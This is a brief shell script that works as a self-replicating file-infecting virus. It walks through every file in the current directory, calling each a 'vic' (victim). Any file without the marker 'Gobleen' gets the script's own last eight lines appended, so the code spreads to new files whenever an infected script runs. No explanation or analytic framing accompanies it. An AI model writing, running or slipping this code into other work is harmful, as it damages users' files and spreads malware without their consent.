for vic in *
do
 if [ -z "`grep -s Gobleen $vic`" ]
 then
  echo >> $vic
  tail -n 8 $0 >> $vic
 fi 
done